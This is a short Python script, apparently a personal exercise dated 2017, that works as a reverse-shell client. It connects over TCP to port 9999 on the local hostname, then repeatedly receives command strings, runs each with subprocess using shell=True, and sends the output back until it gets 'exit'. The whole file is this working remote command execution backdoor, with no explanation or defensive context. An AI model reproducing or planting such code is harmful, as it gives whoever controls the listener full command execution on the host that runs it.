###########################
# Thibault Lebourgeois    #
# 05/02/2017              #
###########################

# IMPORTS
import socket
import subprocess


# MAIN
if __name__ == "__main__":
    host = socket.gethostname()
    port = 9999
    BUFFER_SIZE = 4096

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send("ok")
    data = None

    while data != 'exit':
        data = client.recv(BUFFER_SIZE)
        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = process.stdout.read() + process.stderr.read()
        client.send(stdout_value)

    client.close()
